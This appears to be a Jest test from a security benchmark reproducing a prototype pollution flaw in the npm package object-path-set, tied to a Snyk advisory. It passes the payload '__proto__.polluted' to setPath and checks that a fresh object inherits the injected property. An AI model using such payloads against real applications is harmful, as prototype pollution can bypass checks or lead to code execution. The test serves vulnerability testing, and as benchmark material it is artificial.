//https://snyk.io/vuln/SNYK-JS-OBJECTPATH-1017036
test("prototype pollution in object-path-set ", () => {
  const setPath = require("object-path-set");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  setPath({}, process.env.SECBENCH_PAYLOAD || "__proto__.polluted", "yes");
  expect(obj.polluted).toBe("yes");
});
